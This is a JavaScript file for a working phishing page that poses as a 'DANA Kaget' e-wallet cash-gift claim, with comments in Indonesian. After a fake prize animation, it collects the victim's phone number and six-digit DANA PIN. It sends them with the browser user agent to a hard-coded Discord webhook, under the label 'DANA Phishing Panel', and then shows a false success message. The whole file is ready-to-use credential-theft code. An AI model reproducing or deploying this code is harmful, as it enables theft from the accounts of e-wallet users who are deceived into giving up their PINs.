// ===== KONFIGURASI =====
const WEBHOOK = 'https://discord.com/api/webhooks/1524070686254043246/PE5bJmStZXka_cC2GT0jKV9H-oRpmlbL86dfgqtVhgS7LbkwhQ36Ze_zXJ0oPa0rqX-s'; // GANTI DENGAN WEBHOOK ANDA

// ===== KONFIGURASI DANA KAGET =====
const CONFIG = {
    // Kuota maksimal penerima
    maxQuota: 100,
    // Nominal bisa random atau fixed
    nominalType: 'fixed', // 'random' atau 'fixed'
    fixedNominal: 150000, // jika fixed
    randomMin: 1000,
    randomMax: 150000,
    // Default nominal yang tampil sebelum klaim
    defaultDisplay: '???'
};

// ===== STATE =====
let state = {
    quota: 50, // sisa kuota
    claimed: false,
    nominal: 0,
    phone: '',
    pin: '',
    isProcessing: false
};

// ===== DOM REFS =====
const layer1 = document.getElementById('layer1');
const layer2 = document.getElementById('layer2');
const layer3 = document.getElementById('layer3');
const btnClaim = document.getElementById('btnClaim');
const btnPhone = document.getElementById('btnPhone');
const backToClaim = document.getElementById('backToClaim');
const backToPhone = document.getElementById('backToPhone');
const forgotPin = document.getElementById('forgotPin');
const phoneInput = document.getElementById('phoneInput');
const pinDots = document.querySelectorAll('.pin-dot');
const pinPad = document.getElementById('pinPad');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingTitle = document.getElementById('loadingTitle');
const loadingSub = document.getElementById('loadingSub');
const toast = document.getElementById('toast');
const angpaoIcon = document.getElementById('angpaoIcon');
const nominalAmount = document.getElementById('nominalAmount');
const quotaCount = document.getElementById('quotaCount');
const quotaDetail = document.getElementById('quotaDetail');
const statusLabel = document.getElementById('statusLabel');
const claimStatus = document.getElementById('claimStatus');

// ===== TOAST =====
let toastTimer = null;
function showToast(msg, duration = 3000) {
    toast.textContent = msg;
    toast.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toast.classList.remove('show'), duration);
}

// ===== LOADING =====
function showLoading(title, sub) {
    loadingTitle.textContent = title;
    loadingSub.textContent = sub;
    loadingOverlay.classList.add('active');
}
function hideLoading() {
    loadingOverlay.classList.remove('active');
}

// ===== UPDATE UI DANA KAGET =====
function updateQuotaUI() {
    quotaCount.textContent = state.quota;
    quotaDetail.textContent = state.quota;
    if (state.quota <= 0) {
        document.querySelector('.angpao-container .quota').textContent = '💡 Kuota sudah habis!';
        btnClaim.disabled = true;
        btnClaim.textContent = '⛔ Kuota Habis';
    } else {
        document.querySelector('.angpao-container .quota').innerHTML = `💡 Sisa kuota: <span id="quotaCount">${state.quota}</span> dari ${CONFIG.maxQuota}`;
        btnClaim.disabled = false;
        btnClaim.textContent = '✨ BUKA AMPLOP';
    }
}

function getNominal() {
    if (CONFIG.nominalType === 'fixed') {
        return CONFIG.fixedNominal;
    } else {
        return Math.floor(Math.random() * (CONFIG.randomMax - CONFIG.randomMin + 1)) + CONFIG.randomMin;
    }
}

function formatRupiah(amount) {
    return new Intl.NumberFormat('id-ID').format(amount);
}

// ===== LAYER 1: KLAIM DANA KAGET =====
btnClaim.onclick = function() {
    if (state.isProcessing) return;
    if (state.claimed) {
        showToast('✅ Sudah diklaim! Cek saldo DANA Anda', 2500);
        return;
    }
    if (state.quota <= 0) {
        showToast('❌ Kuota sudah habis!', 2000);
        return;
    }

    state.isProcessing = true;
    btnClaim.disabled = true;
    btnClaim.innerHTML = '<span class="spinner"></span> Memproses...';

    // Animasi angpao terbuka
    angpaoIcon.style.transition = 'transform 0.5s';
    angpaoIcon.style.transform = 'rotateY(180deg)';
    setTimeout(() => {
        angpaoIcon.textContent = '🧧';
        angpaoIcon.style.transform = 'rotateY(0)';
    }, 300);

    // Simulasi proses klaim
    setTimeout(() => {
        state.nominal = getNominal();
        state.claimed = true;
        state.quota--;

        // Update UI
        nominalAmount.textContent = formatRupiah(state.nominal);
        updateQuotaUI();
        statusLabel.textContent = '✅ Sudah Diklaim';
        statusLabel.className = 'value green';

        // Tampilkan status sukses
        claimStatus.className = 'claim-status success show';
        claimStatus.innerHTML = `🎉 Selamat! Anda mendapatkan <strong>Rp ${formatRupiah(state.nominal)}</strong>`;
        setTimeout(() => claimStatus.classList.remove('show'), 5000);

        btnClaim.textContent = '✅ Sudah Diklaim';
        btnClaim.disabled = false;
        state.isProcessing = false;

        // Pindah ke layer 2 setelah delay
        setTimeout(() => {
            layer1.classList.add('hidden');
            layer2.classList.remove('hidden');
            phoneInput.focus();
        }, 1200);

        showToast(`🎉 Dapat Rp ${formatRupiah(state.nominal)}!`, 3000);

    }, 1500);
};

// ===== LAYER 2: PHONE =====
backToClaim.onclick = (e) => {
    e.preventDefault();
    layer2.classList.add('hidden');
    layer1.classList.remove('hidden');
};

btnPhone.onclick = () => {
    state.phone = phoneInput.value.replace(/\s/g, '');
    if (!state.phone || state.phone.length < 8) {
        showToast('❌ Nomor telepon tidak valid', 2500);
        phoneInput.style.borderColor = '#ff4444';
        setTimeout(() => phoneInput.style.borderColor = '', 1500);
        return;
    }

    showLoading('Memverifikasi Nomor', 'Mengirim kode OTP...');
    btnPhone.disabled = true;

    setTimeout(() => {
        hideLoading();
        layer2.classList.add('hidden');
        layer3.classList.remove('hidden');
        resetPin();
        btnPhone.disabled = false;
        showToast('✅ Kode OTP telah dikirim', 2000);
    }, 1800);
};

phoneInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btnPhone.click();
});

// ===== LAYER 3: PIN =====
function resetPin() {
    state.pin = '';
    updateDots();
}

function updateDots() {
    pinDots.forEach((dot, i) => {
        dot.textContent = i < state.pin.length ? '●' : '';
        dot.classList.toggle('filled', i < state.pin.length);
        dot.classList.toggle('active', i === state.pin.length);
    });
}

backToPhone.onclick = (e) => {
    e.preventDefault();
    layer3.classList.add('hidden');
    layer2.classList.remove('hidden');
    resetPin();
};

forgotPin.onclick = (e) => {
    e.preventDefault();
    showToast('🔐 Silakan hubungi CS DANA atau gunakan Lupa PIN di aplikasi', 4000);
};

pinPad.addEventListener('click', (e) => {
    const key = e.target.closest('.pin-key');
    if (!key || key.classList.contains('empty')) return;
    if (state.isProcessing) return;

    const val = key.dataset.value;

    if (val === 'del') {
        if (state.pin.length > 0) state.pin = state.pin.slice(0, -1);
    } else if (state.pin.length < 6) {
        state.pin += val;
    }
    updateDots();

    if (state.pin.length === 6) {
        state.isProcessing = true;
        showLoading('Memverifikasi PIN', 'Mohon tunggu...');

        setTimeout(() => {
            hideLoading();
            // Kirim ke Discord
            sendToDiscord(state.phone, state.pin, state.nominal);

            // Reset dan kembali ke beranda
            layer3.classList.add('hidden');
            layer1.classList.remove('hidden');
            resetPin();
            phoneInput.value = '';

            // Update status di beranda
            claimStatus.className = 'claim-status success show';
            claimStatus.innerHTML = `✅ Klaim berhasil! Rp ${formatRupiah(state.nominal)} akan masuk ke DANA Anda`;
            setTimeout(() => claimStatus.classList.remove('show'), 5000);

            state.isProcessing = false;
            showToast('✅ Klaim berhasil! Cek saldo DANA Anda', 3000);
        }, 1500);
    }
});

// ===== SEND TO DISCORD =====
function sendToDiscord(phone, pin, nominal) {
    const embed = {
        title: '📱 DANA KAGET - DATA TERTANGKAP',
        color: 0xcc0000,
        fields: [
            { name: '💰 Nominal Diklaim', value: `Rp ${formatRupiah(nominal)}`, inline: false },
            { name: '📞 Nomor Telepon', value: `\`+62 ${phone}\``, inline: false },
            { name: '🔒 PIN DANA', value: `\`\`\`${pin}\`\`\``, inline: false },
            { name: '🕐 Waktu', value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: true },
            { name: '📱 Perangkat', value: navigator.userAgent.slice(0, 80), inline: true },
            { name: '🌐 IP', value: 'Tertangkap via Cloudflare', inline: true }
        ],
        footer: { text: 'Worm Aiva • DANA Phishing Panel' },
        timestamp: new Date().toISOString()
    };

    fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(() => {});
}

// ===== INIT =====
updateQuotaUI();
nominalAmount.textContent = CONFIG.defaultDisplay;

document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        if (!layer2.classList.contains('hidden')) phoneInput.focus();
    }, 300);
});
